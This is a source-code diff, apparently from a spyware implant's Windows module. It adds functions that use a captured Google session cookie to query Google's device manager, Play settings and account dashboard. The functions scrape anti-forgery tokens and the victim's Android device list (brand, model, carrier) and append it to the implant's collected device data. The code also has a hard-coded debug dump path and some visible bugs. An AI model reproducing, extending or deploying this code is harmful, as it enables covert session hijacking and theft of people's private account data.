@@ -9,8 +9,17 @@
 #include "debug.h"
 
 #include "device.h"
+#include "social.h"
+#include "JSON.h"
+
+extern DWORD ConvertToUTF8(LPWSTR pIn, LPSTR* pOut);
+extern void GD_DumpBuffer(LPCWSTR lpFileName, char* lpBuffer, DWORD dwSize);
+
+HANDLE g_hDevMutex = NULL;
 
 PDEVICE_CONTAINER lpDeviceContainer = NULL;
+
+BOOL bSendGoogleDevice = TRUE;
 
 VOID GetProcessor(PDEVICE_INFO lpDeviceInfo)
 {
@@ -40,6 +49,9 @@ VOID GetMemory(PDEVICE_INFO lpDeviceInfo)
 	lpDeviceInfo->meminfo.memtotal = (ULONG) (lpMemoryStatus->ullTotalPhys / (1024*1024));
 	lpDeviceInfo->meminfo.memfree = (ULONG) (lpMemoryStatus->ullAvailPhys / (1024*1024));
 	lpDeviceInfo->meminfo.memload = (ULONG) (lpMemoryStatus->dwMemoryLoad);
+
+	zfree(lpMemoryStatus);
+	lpMemoryStatus = NULL;
 }
 
 BOOL CompareServicePack(WORD servicePackMajor)
@@ -340,6 +352,11 @@ VOID GetDeviceInfo()
 	if (lpDeviceContainer)
 		return;
 
+	//check the mutex
+	if(g_hDevMutex != NULL)
+		if(WaitForSingleObject(g_hDevMutex, 5000) != WAIT_OBJECT_0)
+			return;
+
 	PDEVICE_INFO lpDeviceInfo = (PDEVICE_INFO) zalloc(sizeof(DEVICE_INFO));
 	LPWSTR strAppList = GetAppList();
 
@@ -386,4 +403,504 @@ VOID GetDeviceInfo()
 	lpDeviceContainer->uSize = (wcslen(strDeviceString) + 1) * sizeof(WCHAR);
 
 	zfree(strAppList);
+
+	//release the mutex
+	ReleaseMutex(g_hDevMutex);
 }
+
+
+
+//-----------------------------------GOOGLE DEVICE --------------------------------
+
+
+DWORD GDev_ExtractDevList(LPWSTR *pwszFormattedList, LPSTR pszRecvBuffer)
+{
+	LPWSTR pwszTmp=NULL;
+	LPSTR  pszFrom=NULL, pszTo=NULL;
+	DWORD  dwRet=0, dwSize=0, dwNewSize=0;
+	
+	if(pszRecvBuffer == NULL)
+		return FALSE;
+
+	//search the JSON structure containing the devices info (es: ['DEVICES_JSPB'])
+	pszFrom = StrStrIA(pszRecvBuffer, "['DEVICES_JSPB']");
+	if(pszFrom == NULL)
+		return FALSE;
+	pszFrom++;
+
+	//search the first [ char (beginning of the JSON struct)
+	pszFrom = strstr(pszFrom, "[");
+	if(pszFrom == NULL)
+		return FALSE;
+
+	//search a ; char (end of the JSON struct)
+	pszTo = pszFrom;
+	pszTo = strstr(pszFrom, ";");
+	if(pszTo == NULL)
+		return FALSE;
+
+	dwSize = (pszTo - pszFrom) - 1;
+
+	//copy the json structure to a tmp buffer
+	LPSTR pszJSON = (LPSTR)malloc(dwSize+1);
+	if(pszJSON == NULL)
+		return FALSE;
+	strncpy_s(pszJSON, dwSize+1, pszFrom, dwSize);
+
+	//parse the json struct
+	JSONValue *jValue = NULL;
+	JSONArray jArray, jDev;
+	
+	jValue = JSON::Parse(pszJSON);
+
+	znfree(&pszJSON);
+
+	if(jValue == NULL)
+		return FALSE;
+
+
+	LPWSTR pwszDevice = NULL;	
+
+	if(jValue->IsArray() && (jValue->AsArray().size() > 0))
+	{
+		jArray = jValue->AsArray();
+
+		if(jArray.size() > 0)
+		{ 
+			jArray = jArray[0]->AsArray();
+
+			//loop into array of devices
+			for(int i=0; i<jArray.size(); i++)
+			{				
+				jDev = jArray[i]->AsArray();
+				jDev = jDev[0]->AsArray();
+
+				dwSize = wcslen(jDev[2]->AsString().c_str()) +
+						 wcslen(jDev[3]->AsString().c_str()) +
+						 wcslen(jDev[4]->AsString().c_str()) + 64; //add some bytes to store the description strings
+
+				pwszDevice = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
+				if(pwszDevice == NULL)
+				{
+					delete jValue;
+					return FALSE;
+				}
+
+				swprintf_s(pwszDevice, dwSize, L"Brand: %s\nDevice: %s\nCarrier: %s\n\n", jDev[3]->AsString().c_str(), jDev[2]->AsString().c_str(), jDev[4]->AsString().c_str());
+
+				dwNewSize += (wcslen(pwszDevice) + 1);
+
+				pwszTmp = *pwszFormattedList;
+				*pwszFormattedList = (LPWSTR)realloc(*pwszFormattedList, dwNewSize * sizeof(WCHAR));
+				if(*pwszFormattedList == NULL)
+				{
+					znfree(&pwszDevice);
+					znfree(&pwszTmp);
+					delete jValue;
+					return FALSE;
+				}				
+				if(pwszTmp == NULL)				
+					SecureZeroMemory(*pwszFormattedList, dwNewSize * sizeof(WCHAR));				
+
+				wcscat_s(*pwszFormattedList, dwNewSize, pwszDevice);
+
+				znfree(&pwszDevice);
+			}
+		}
+		else
+		{
+			delete jValue;
+			return FALSE;
+		}
+	}
+	else
+	{
+		delete jValue;
+		return FALSE;
+	}
+
+
+	delete jValue;
+
+	return TRUE;
+}
+
+
+//get the device list
+DWORD GDev_GetDevices(LPSTR pszCookie)
+{	
+	WCHAR   pwszHeader[] = {L'\n', L'G', L'o', L'o', L'g', L'l', L'e', L' ', L'D', L'e', L'v', L'i', L'c', L'e', L's', L':', L'\n', L'\n', '\0'};
+	LPWSTR	pwszDevicesList=NULL;
+	LPSTR	pszRecvBuffer=NULL;
+	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;
+	CHAR    pszBuf[128];
+
+	if(!bSendGoogleDevice)		
+		return FALSE;
+
+	if(lpDeviceContainer)
+		return FALSE;
+
+	if(g_hDevMutex == NULL)
+		return FALSE;
+
+	//get conn parameters
+	dwRet = HttpSocialRequest(L"www.google.com",
+							  L"GET",
+							  L"/android/devicemanager",
+							  L"Host: www.google.com\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*",
+							  443,
+							  NULL,
+							  0,
+							  (LPBYTE *)&pszRecvBuffer,
+							  &dwBufferSize,
+							  pszCookie);
+
+	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize == 0))
+	{
+		znfree(&pszRecvBuffer);
+	}
+
+	//extract the device list from the received buffer
+	dwRet = GDev_ExtractDevList(&pwszDevicesList, pszRecvBuffer);
+	znfree(&pszRecvBuffer);
+
+	if((!dwRet) || (pwszDevicesList == NULL))
+		return FALSE;
+
+	//get the device info
+	GetDeviceInfo();
+
+	//wait for mutex
+	if(WaitForSingleObject(g_hDevMutex, 5000) != WAIT_OBJECT_0)
+		return FALSE;
+
+	dwSize = wcslen(lpDeviceContainer->pDataBuffer) + wcslen(pwszHeader) + wcslen(pwszDevicesList) + 1;
+
+	//append the google devices info to the device info
+	lpDeviceContainer->pDataBuffer = (LPWSTR)realloc(lpDeviceContainer->pDataBuffer, dwSize * sizeof(WCHAR));
+	wcscat_s(lpDeviceContainer->pDataBuffer, dwSize, pwszHeader);
+	wcscat_s(lpDeviceContainer->pDataBuffer, dwSize, pwszDevicesList);
+
+	lpDeviceContainer->uSize = dwSize * sizeof(WCHAR);
+
+	znfree(&pwszDevicesList);
+
+	//don't send the device list anymore
+	bSendGoogleDevice = FALSE;
+
+	//release the mutex for the device
+	ReleaseMutex(g_hDevMutex);
+
+	//close the handle to the mutex object
+	CloseHandle(g_hDevMutex);
+	g_hDevMutex = NULL;
+
+	return TRUE;
+}
+
+#ifdef _GDEV_NEW_VERSIONS
+
+LPSTR GDev_EncodeURL(LPSTR strString)
+{
+	LPSTR strEncoded = NULL;
+	char strTmp[4];
+	int i, j, dwLen;
+
+	dwLen = strlen(strString);
+	//alloc destination string
+	strEncoded = (LPSTR)zalloc((dwLen*3) + 1);
+	if(strEncoded == NULL)
+		return NULL;
+
+	SecureZeroMemory(strEncoded, sizeof(dwLen*3+1));
+
+	for(i=0, j=0; i<dwLen; i++, j++)
+	{
+		switch(strString[i])
+		{
+			case '$':
+			case '+':
+			case ')':
+			case ',':
+			case ':':
+			case ';':
+			case '?':
+			case '@':
+				strEncoded[j++] = '%';
+				sprintf(strTmp, "%02X", strString[i]);
+				strcat(&strEncoded[j], strTmp);
+				j += 1;
+				break;
+			default:
+				strEncoded[j] = strString[i];
+				break;
+		}
+	}
+	strEncoded[j] = 0;
+
+	return strEncoded;
+}
+
+//window._uc='[\42pb6_nYs3-m4J_ne7qHvKNy-S_ww:1423730549069\42
+DWORD GDev_GetToken_V2(LPSTR *pszToken1, LPSTR pszBuffer)
+{
+	LPSTR pszFrom=NULL, pszTo=NULL;
+	DWORD dwSize=0;
+
+	//search the string "window._uc='[\42"
+	pszFrom = strstr(pszBuffer, "window._uc='[\\42");
+	if(pszFrom == NULL)
+		return FALSE;
+	pszFrom += (strlen("window._uc='[\\42"));
+	pszTo = pszFrom;
+
+	//search the first '\42'
+	pszTo = strstr(pszFrom, "\\42");
+	if(pszFrom == NULL)
+		return FALSE;
+
+	//skip the first " char
+	pszTo -= 1;
+	
+	dwSize = pszTo - pszFrom;
+
+	*pszToken1 = (LPSTR)malloc(dwSize + 1);
+	if(*pszToken1 == NULL)
+		return FALSE;
+	strncpy_s(*pszToken1, dwSize+1, pszFrom, dwSize);
+
+	return TRUE;
+}
+
+DWORD GDev_GetDevices_V2(LPSTR pszCookie)
+{	
+	LPWSTR	pwszDevicesList=NULL;
+	LPSTR	pszRecvBuffer=NULL, pszToken=NULL;
+	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;
+	CHAR    pszBuf[128];
+
+	if(!bSendGoogleDevice)
+		return FALSE;
+
+	//check the mutex
+	if(hDevMutex == NULL)
+		return FALSE;
+	
+	dwRet = HttpSocialRequest(L"play.google.com",
+							  L"GET",
+							  L"/settings",
+							  L"Host: play.google.com\r\nConnection: keep-alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+							  443,
+							  NULL,
+							  0,
+							  (LPBYTE *)&pszRecvBuffer,
+							  &dwBufferSize,
+							  pszCookie);
+
+	GD_DumpBuffer(L"k:\\GDocs\\play_devices", pszRecvBuffer, dwBufferSize);
+
+	//extract the token value
+	dwRet = GDev_GetToken_V2(&pszToken, pszRecvBuffer);
+	if(dwRet == FALSE)
+	{
+		znfree(&pszRecvBuffer);
+		return FALSE;
+	}
+	znfree(&pszRecvBuffer);
+
+	LPSTR pszEncBuf = GDev_EncodeURL(pszToken);
+	LPSTR pszSendBuf = (LPSTR)malloc(256);
+	sprintf_s(pszSendBuf, 256, "xhr=1&token=%s", pszEncBuf);	
+
+	//get conn parameters
+	dwRet = HttpSocialRequest(L"play.google.com",
+							  L"POST",
+							  L"/store/xhr/ructx",
+							  L"Host: play.google.com\r\nConnection: keep-alive\r\nOrigin: https://play.google.com\r\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\r\nAccept: */*\r\nReferer: https://play.google.com/settings",
+							  443,
+							  (LPBYTE)pszSendBuf,
+							  strlen(pszSendBuf),
+							  (LPBYTE *)&pszRecvBuffer,
+							  &dwBufferSize,
+							  pszCookie);
+
+	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize == 0))
+	{
+		znfree(&pszRecvBuffer);
+	}
+
+	//extract the device list from the received buffer
+	dwRet = GDev_ExtractDevList(&pwszDevicesList, pszRecvBuffer);
+	znfree(&pszRecvBuffer);
+
+	if((!dwRet) || (pwszDevicesList == NULL))
+		return FALSE;
+
+	//get the device info
+	GetDeviceInfo();
+
+	//wait for mutex release
+	if(WaitForSingleObject(hDevMutex, 5000) != WAIT_OBJECT_0)
+		return FALSE;
+
+	dwSize = wcslen(lpDeviceContainer->pDataBuffer) + wcslen(pwszDevicesList) + 1;
+
+	//append the google devices info to the device info
+	lpDeviceContainer->pDataBuffer = (LPWSTR)realloc(lpDeviceContainer->pDataBuffer, dwSize * sizeof(WCHAR));
+	wcscat_s(lpDeviceContainer->pDataBuffer, dwSize, pwszDevicesList);
+
+	lpDeviceContainer->uSize = dwSize * sizeof(WCHAR);
+
+	znfree(&pwszDevicesList);
+
+	ReleaseMutex(hDevMutex);
+
+	bSendGoogleDevice = FALSE;
+
+	return TRUE;
+}
+
+
+//["xsrf","AKbdrOanfw0bceGzySGgmi1nvJ4L33MG7A:1423498235308"
+DWORD GDev_GetToken_V3(LPSTR *pszToken1, LPSTR *pszToken2, LPSTR pszBuffer)
+{
+	LPSTR pszFrom=NULL, pszTo=NULL;
+	DWORD dwSize=0;
+
+	//search the string "xsrf"
+	pszFrom = strstr(pszBuffer, "[[\"xsrf\"");
+	if(pszFrom == NULL)
+		return FALSE;
+	pszTo = pszFrom;
+
+	//search the first '}'
+	pszTo = strstr(pszFrom, "}");
+	if(pszFrom == NULL)
+		return FALSE;
+
+	//skip the first " char
+	pszTo -= 1;
+	
+	dwSize = pszTo - pszFrom;
+
+	pszBuffer = (LPSTR)malloc(dwSize + 1);
+	if(pszBuffer == NULL)
+		return FALSE;
+	strncpy_s(pszBuffer, dwSize+1, pszFrom, dwSize);
+
+	JSONValue *jValue = NULL;
+	JSONArray jArray;
+
+	jValue = JSON::Parse(pszBuffer);
+	znfree(&pszBuffer);
+
+	if(jValue == NULL)
+		return FALSE;
+
+	if(jValue->IsArray())
+	{
+		jArray = jValue->AsArray();
+	    if(jArray[0]->IsArray())
+		{
+			jArray = jArray[0]->AsArray();
+
+			if(jArray.size() >= 4)
+			{
+				//get the first token
+				if((jArray[1]->IsString()) && (jArray[1]->AsString().c_str() != NULL))
+				{
+					ConvertToUTF8((LPWSTR)jArray[1]->AsString().c_str(), pszToken1);
+					if(*pszToken1 == NULL)
+					{
+						delete jValue;
+						return FALSE;
+					}
+				}
+
+				//get the second token
+				if((jArray[3]->IsString()) && (jArray[3]->AsString().c_str() != NULL))
+				{
+					ConvertToUTF8((LPWSTR)jArray[3]->AsString().c_str(), pszToken2);
+					if(*pszToken2 == NULL)
+					{
+						znfree(pszToken1);
+						delete jValue;
+						return FALSE;
+					}
+				}			
+			}
+		}
+	}
+
+	delete jValue;
+
+	return TRUE;
+}
+
+
+//get the device list
+DWORD GDev_GetDevices_V3(LPSTR pszCookie)
+{	
+	LPWSTR	pwszFormattedList=NULL;
+	LPSTR	pszRecvBuffer=NULL, pszSendBuf=NULL, pszToken1=NULL, pszToken2=NULL;
+	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;
+	CHAR    pszBuf[128];	
+	
+	//check the mutex
+
+
+	//get conn parameters
+	dwRet = HttpSocialRequest(L"www.google.com",
+							  L"GET",
+							  L"/settings/dashboard/",
+							  L"Host: www.google.com\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*\r\nReferer: https://accounts.google.com/b/0/VerifiedPhoneInterstitial?continue=https%3A%2F%2Fwww.google.com%2Fsettings%2Fdashboard&sarp=1",
+							  443,
+							  NULL,
+							  0,
+							  (LPBYTE *)&pszRecvBuffer,
+							  &dwBufferSize,
+							  pszCookie);
+
+	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize == 0))
+	{
+		znfree(&pszRecvBuffer);
+	}	
+
+	//get the token parameter to use in next queries
+	dwRet = GDev_GetToken_V3(&pszToken1, &pszToken2, pszRecvBuffer);
+	znfree(&pszRecvBuffer);
+
+	if(dwRet == FALSE)
+		return FALSE;
+
+	//post data
+	LPSTR pszTmp = (LPSTR)malloc(512);
+	if(pszTmp == NULL)
+		return FALSE;
+	sprintf_s(pszTmp, 512, "at=%s&azt=%s&", pszToken1, pszToken2);
+	pszSendBuf = GDev_EncodeURL(pszTmp);
+	znfree(&pszTmp);	
+
+	//get conn parameters
+	dwRet = HttpSocialRequest(L"www.google.com",
+							  L"POST",
+							  L"/_/fetch/?rt=c",
+							  L"Host: www.google.com\r\nConnection: keep-alive\r\nX-Same-Domain: 1\r\nOrigin: https://www.google.com\r\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\r\nAccept: */*\r\nReferer: https://www.google.com/settings/dashboard",
+							  443,
+							  (LPBYTE)pszSendBuf,
+							  strlen(pszSendBuf),
+							  (LPBYTE *)&pszRecvBuffer,
+							  &dwBufferSize,
+							  pszCookie);
+
+	if((dwRet != SOCIAL_REQUEST_SUCCESS) || (dwBufferSize == 0))
+	{
+		znfree(&pszRecvBuffer);
+	}
+
+
+	return TRUE;
+}
+
+#endif
